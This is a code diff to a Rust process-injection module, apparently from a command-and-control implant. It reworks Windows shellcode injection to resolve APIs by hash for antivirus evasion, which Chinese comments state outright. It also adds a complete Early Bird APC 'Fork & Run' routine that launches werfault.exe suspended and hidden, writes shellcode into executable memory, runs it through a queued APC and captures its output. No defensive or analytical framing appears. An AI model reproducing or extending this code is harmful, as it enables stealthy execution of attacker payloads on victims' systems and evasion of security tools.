@@ -100,24 +100,18 @@ impl ProcessInjector {
     /// Windows Shellcode 注入接口
     #[cfg(target_os = "windows")]
     pub async fn inject_shellcode(pid: u32, shellcode: Vec<u8>) -> CommandResult {
-        let k32_raw = obf_str!("kernel32.dll");
-        let kernel32_name = std::ffi::CString::new(crate::utils::decode_obf(&k32_raw)).unwrap();
-        let h_kernel32 = unsafe { winapi::um::libloaderapi::GetModuleHandleA(kernel32_name.as_ptr()) };
-        
-        // 辅助函数：动态获取导出函数地址
-        let get_fn = |name_raw: Vec<u8>| unsafe {
-            let name = crate::utils::decode_obf(&name_raw);
-            let c_name = std::ffi::CString::new(name).unwrap();
-            winapi::um::libloaderapi::GetProcAddress(h_kernel32, c_name.as_ptr())
-        };
+        let h_kernel32 = unsafe { crate::stealth::get_module_base(crate::stealth::hash_module_name(b"kernel32.dll")) };
+        if h_kernel32 == 0 {
+            return CommandResult { stdout: String::new(), stderr: "Failed to resolve kernel32".into(), path: None, req_id: None };
+        }
 
         // 运行时动态解析敏感 API (免杀强化)
-        let p_open_process = get_fn(obf_str!("OpenProcess"));
-        let p_virtual_alloc_ex = get_fn(obf_str!("VirtualAllocEx"));
-        let p_write_process_memory = get_fn(obf_str!("WriteProcessMemory"));
-        let p_create_remote_thread = get_fn(obf_str!("CreateRemoteThread"));
+        let p_open_process = unsafe { crate::stealth::get_api_addr(h_kernel32, crate::stealth::hash_api_name(b"OpenProcess")).unwrap_or(0) };
+        let p_virtual_alloc_ex = unsafe { crate::stealth::get_api_addr(h_kernel32, crate::stealth::hash_api_name(b"VirtualAllocEx")).unwrap_or(0) };
+        let p_write_process_memory = unsafe { crate::stealth::get_api_addr(h_kernel32, crate::stealth::hash_api_name(b"WriteProcessMemory")).unwrap_or(0) };
+        let p_create_remote_thread = unsafe { crate::stealth::get_api_addr(h_kernel32, crate::stealth::hash_api_name(b"CreateRemoteThread")).unwrap_or(0) };
 
-        if p_open_process.is_null() || p_virtual_alloc_ex.is_null() || p_write_process_memory.is_null() || p_create_remote_thread.is_null() {
+        if p_open_process == 0 || p_virtual_alloc_ex == 0 || p_write_process_memory == 0 || p_create_remote_thread == 0 {
             return CommandResult {
                 stdout: String::new(),
                 stderr: "APIs resolved failed".to_string(),
@@ -132,10 +126,11 @@ impl ProcessInjector {
         type WriteProcessMemoryFn = unsafe extern "system" fn(*mut winapi::ctypes::c_void, *mut winapi::ctypes::c_void, *const winapi::ctypes::c_void, usize, *mut usize) -> i32;
         type CreateRemoteThreadFn = unsafe extern "system" fn(*mut winapi::ctypes::c_void, *mut winapi::ctypes::c_void, usize, *const winapi::ctypes::c_void, *mut winapi::ctypes::c_void, u32, *mut u32) -> *mut winapi::ctypes::c_void;
 
-        let open_process: OpenProcessFn = unsafe { std::mem::transmute(p_open_process) };
-        let virtual_alloc_ex: VirtualAllocExFn = unsafe { std::mem::transmute(p_virtual_alloc_ex) };
-        let write_process_memory: WriteProcessMemoryFn = unsafe { std::mem::transmute(p_write_process_memory) };
-        let create_remote_thread: CreateRemoteThreadFn = unsafe { std::mem::transmute(p_create_remote_thread) };
+        let open_process: OpenProcessFn = unsafe { std::mem::transmute(p_open_process as *const ()) };
+        let virtual_alloc_ex: VirtualAllocExFn = unsafe { std::mem::transmute(p_virtual_alloc_ex as *const ()) };
+        let write_process_memory: WriteProcessMemoryFn = unsafe { std::mem::transmute(p_write_process_memory as *const ()) };
+        let create_remote_thread: CreateRemoteThreadFn = unsafe { std::mem::transmute(p_create_remote_thread as *const ()) };
+
 
         // 尝试开启 Debug 权限
         if Self::enable_debug_privilege() {
@@ -229,6 +224,216 @@ impl ProcessInjector {
         }
     }
     
+    /// Windows 傀儡进程 (Process Hollowing / Early Bird APC) - 推荐高隐蔽模式
+    #[cfg(target_os = "windows")]
+    pub async fn hollow_shellcode(shellcode: Vec<u8>, target_exe: Option<&str>) -> CommandResult {
+        use winapi::um::processthreadsapi::{PROCESS_INFORMATION, STARTUPINFOW};
+        use winapi::um::winbase::{CREATE_SUSPENDED, CREATE_NO_WINDOW, STARTF_USESTDHANDLES, HANDLE_FLAG_INHERIT};
+        use winapi::um::minwinbase::SECURITY_ATTRIBUTES;
+        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, HANDLE};
+        use winapi::shared::minwindef::{FALSE, TRUE};
+        use winapi::um::errhandlingapi::GetLastError;
+        use std::ptr;
+        use std::os::windows::ffi::OsStrExt;
+        use std::os::windows::io::FromRawHandle;
+        use std::io::Read;
+
+        let h_kernel32 = unsafe { crate::stealth::get_module_base(crate::stealth::hash_module_name(b"kernel32.dll")) };
+        if h_kernel32 == 0 {
+            return CommandResult { stdout: String::new(), stderr: "Failed to resolve kernel32".into(), path: None, req_id: None };
+        }
+
+        // Dynamic API Resolution
+        let p_create_pipe = unsafe { crate::stealth::get_api_addr(h_kernel32, crate::stealth::hash_api_name(b"CreatePipe")).unwrap_or(0) };
+        let p_set_handle_info = unsafe { crate::stealth::get_api_addr(h_kernel32, crate::stealth::hash_api_name(b"SetHandleInformation")).unwrap_or(0) };
+        let p_create_process_w = unsafe { crate::stealth::get_api_addr(h_kernel32, crate::stealth::hash_api_name(b"CreateProcessW")).unwrap_or(0) };
+        let p_virtual_alloc_ex = unsafe { crate::stealth::get_api_addr(h_kernel32, crate::stealth::hash_api_name(b"VirtualAllocEx")).unwrap_or(0) };
+        let p_write_process_memory = unsafe { crate::stealth::get_api_addr(h_kernel32, crate::stealth::hash_api_name(b"WriteProcessMemory")).unwrap_or(0) };
+        let p_queue_user_apc = unsafe { crate::stealth::get_api_addr(h_kernel32, crate::stealth::hash_api_name(b"QueueUserAPC")).unwrap_or(0) };
+        let p_resume_thread = unsafe { crate::stealth::get_api_addr(h_kernel32, crate::stealth::hash_api_name(b"ResumeThread")).unwrap_or(0) };
+        let p_terminate_process = unsafe { crate::stealth::get_api_addr(h_kernel32, crate::stealth::hash_api_name(b"TerminateProcess")).unwrap_or(0) };
+        let p_close_handle = unsafe { crate::stealth::get_api_addr(h_kernel32, crate::stealth::hash_api_name(b"CloseHandle")).unwrap_or(0) };
+
+        if p_create_process_w == 0 || p_virtual_alloc_ex == 0 || p_write_process_memory == 0 || p_queue_user_apc == 0 {
+            return CommandResult { stdout: String::new(), stderr: "Missing critical APIs".into(), path: None, req_id: None };
+        }
+
+        type CreatePipeFn = unsafe extern "system" fn(*mut HANDLE, *mut HANDLE, *mut SECURITY_ATTRIBUTES, u32) -> i32;
+        type SetHandleInformationFn = unsafe extern "system" fn(HANDLE, u32, u32) -> i32;
+        type CreateProcessWFn = unsafe extern "system" fn(*const u16, *mut u16, *mut SECURITY_ATTRIBUTES, *mut SECURITY_ATTRIBUTES, i32, u32, *mut winapi::ctypes::c_void, *const u16, *mut STARTUPINFOW, *mut PROCESS_INFORMATION) -> i32;
+        type VirtualAllocExFn = unsafe extern "system" fn(HANDLE, *mut winapi::ctypes::c_void, usize, u32, u32) -> *mut winapi::ctypes::c_void;
+        type WriteProcessMemoryFn = unsafe extern "system" fn(HANDLE, *mut winapi::ctypes::c_void, *const winapi::ctypes::c_void, usize, *mut usize) -> i32;
+        type QueueUserAPCFn = unsafe extern "system" fn(Option<unsafe extern "system" fn(usize)>, HANDLE, usize) -> u32;
+        type ResumeThreadFn = unsafe extern "system" fn(HANDLE) -> u32;
+        type TerminateProcessFn = unsafe extern "system" fn(HANDLE, u32) -> i32;
+        type CloseHandleFn = unsafe extern "system" fn(HANDLE) -> i32;
+
+        let create_pipe: CreatePipeFn = unsafe { std::mem::transmute(p_create_pipe as *const ()) };
+        let set_handle_info: SetHandleInformationFn = unsafe { std::mem::transmute(p_set_handle_info as *const ()) };
+        let create_process_w: CreateProcessWFn = unsafe { std::mem::transmute(p_create_process_w as *const ()) };
+        let virtual_alloc_ex: VirtualAllocExFn = unsafe { std::mem::transmute(p_virtual_alloc_ex as *const ()) };
+        let write_process_memory: WriteProcessMemoryFn = unsafe { std::mem::transmute(p_write_process_memory as *const ()) };
+        let queue_user_apc: QueueUserAPCFn = unsafe { std::mem::transmute(p_queue_user_apc as *const ()) };
+        let resume_thread: ResumeThreadFn = unsafe { std::mem::transmute(p_resume_thread as *const ()) };
+        let terminate_process: TerminateProcessFn = unsafe { std::mem::transmute(p_terminate_process as *const ()) };
+        let close_handle: CloseHandleFn = unsafe { std::mem::transmute(p_close_handle as *const ()) };
+
+        if shellcode.is_empty() {
+             return CommandResult { stdout: String::new(), stderr: "Shellcode is empty".to_string(), path: None, req_id: None };
+        }
+
+        // 尝试开启 Debug 权限 (如果不成功也不强制退出)
+        Self::enable_debug_privilege();
+
+        // 使用局部代码块隔离原生未实现 Send 的句柄结构体
+        let setup_res: Result<(usize, String, u32), String> = {
+            let target_process = target_exe.unwrap_or("C:\\Windows\\System32\\werfault.exe");
+            let mut si: STARTUPINFOW = unsafe { std::mem::zeroed() };
+            si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
+            let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };
+
+            let mut sa = SECURITY_ATTRIBUTES {
+                nLength: std::mem::size_of::<SECURITY_ATTRIBUTES>() as u32,
+                lpSecurityDescriptor: ptr::null_mut(),
+                bInheritHandle: TRUE,
+            };
+            let mut h_read_out: HANDLE = ptr::null_mut();
+            let mut h_write_out: HANDLE = ptr::null_mut();
+
+            unsafe {
+                if p_create_pipe != 0 && create_pipe(&mut h_read_out, &mut h_write_out, &mut sa, 0) == FALSE {
+                    return CommandResult {
+                        stdout: String::new(),
+                        stderr: format!("CreatePipe failed: {}", GetLastError()),
+                        path: None, req_id: None,
+                    };
+                }
+                if p_set_handle_info != 0 {
+                    set_handle_info(h_read_out, HANDLE_FLAG_INHERIT, 0); 
+                }
+            }
+
+            si.hStdOutput = h_write_out;
+            si.hStdError = h_write_out;
+            si.dwFlags |= STARTF_USESTDHANDLES;
+
+            let mut command_line: Vec<u16> = std::ffi::OsStr::new(target_process)
+                .encode_wide()
+                .chain(std::iter::once(0))
+                .collect();
+
+            let res = unsafe {
+                create_process_w(
+                    ptr::null(),
+                    command_line.as_mut_ptr(),
+                    ptr::null_mut(),
+                    ptr::null_mut(),
+                    TRUE,
+                    CREATE_SUSPENDED | CREATE_NO_WINDOW,
+                    ptr::null_mut(),
+                    ptr::null(),
+                    &mut si,
+                    &mut pi,
+                )
+            };
+
+            if p_close_handle != 0 {
+                unsafe { close_handle(h_write_out); }
+            }
+
+            if res == FALSE {
+                if p_close_handle != 0 {
+                    unsafe { close_handle(h_read_out); }
+                }
+                return CommandResult {
+                    stdout: String::new(),
+                    stderr: format!("CreateProcessW failed: {}", unsafe { GetLastError() }),
+                    path: None, req_id: None,
+                };
+            }
+
+            let allocated_memory = unsafe {
+                virtual_alloc_ex(pi.hProcess, ptr::null_mut(), shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+            };
+
+            if allocated_memory.is_null() {
+                if p_terminate_process != 0 && p_close_handle != 0 {
+                    unsafe {
+                        terminate_process(pi.hProcess, 0);
+                        close_handle(pi.hThread); close_handle(pi.hProcess); close_handle(h_read_out);
+                    }
+                }
+                return CommandResult { stdout: String::new(), stderr: "VirtualAllocEx failed".to_string(), path: None, req_id: None };
+            }
+
+            let mut bytes_written: usize = 0;
+            let wr_res = unsafe { write_process_memory(pi.hProcess, allocated_memory, shellcode.as_ptr() as *const _, shellcode.len(), &mut bytes_written) };
+
+            if wr_res == 0 {
+                if p_terminate_process != 0 && p_close_handle != 0 {
+                    unsafe {
+                        terminate_process(pi.hProcess, 0);
+                        close_handle(pi.hThread); close_handle(pi.hProcess); close_handle(h_read_out);
+                    }
+                }
+                return CommandResult { stdout: String::new(), stderr: "WriteProcessMemory failed".to_string(), path: None, req_id: None };
+            }
+
+            unsafe {
+                let apc_routine: unsafe extern "system" fn(usize) = std::mem::transmute(allocated_memory);
+                queue_user_apc(Some(apc_routine), pi.hThread, allocated_memory as usize);
+                resume_thread(pi.hThread);
+                if p_close_handle != 0 {
+                    close_handle(pi.hThread);
+                    close_handle(pi.hProcess); 
+                }
+            }
+
+            Ok((h_read_out as usize, target_process.to_string(), pi.dwProcessId))
+        };
+
+        match setup_res {
+            Ok((h_read_out_usize, target_process, pid)) => {
+                let out_data = match tokio::time::timeout(tokio::time::Duration::from_millis(15000), tokio::task::spawn_blocking(move || {
+                    let mut file = unsafe { std::fs::File::from_raw_handle(h_read_out_usize as _) };
+                    let mut out = String::new();
+                    let mut buf = [0u8; 1024];
+                    while let Ok(n) = file.read(&mut buf) {
+                        if n == 0 { break; } 
+                        out.push_str(&String::from_utf8_lossy(&buf[..n]));
+                    }
+                    out
+                })).await {
+                    Ok(Ok(s)) => s,
+                    _ => "[+] 进程转入后台静默长效驻留，脱离成功".to_string(),
+                };
+
+                CommandResult {
+                    stdout: format!("[*] Fork & Run 傀儡进程创建成功！\n[*] 宿主白名单: {}\n[*] PID: {}\n[*] 截获输出流:\n{}", target_process, pid, out_data.trim()),
+                    stderr: String::new(),
+                    path: None,
+                    req_id: None,
+                }
+            },
+            Err(e) => CommandResult {
+                stdout: String::new(),
+                stderr: e,
+                path: None,
+                req_id: None,
+            }
+        }
+    }
+    
+    #[cfg(not(target_os = "windows"))]
+    pub async fn hollow_shellcode(_shellcode: Vec<u8>, _target_exe: Option<&str>) -> CommandResult {
+        CommandResult {
+            stdout: String::new(),
+            stderr: "当前平台不支持傀儡进程注入".to_string(),
+            path: None,
+            req_id: None,
+        }
+    }
+
     /// 非 Windows 平台占位实现
     #[cfg(not(target_os = "windows"))]
     pub async fn inject_shellcode(_pid: u32, _shellcode: Vec<u8>) -> CommandResult {
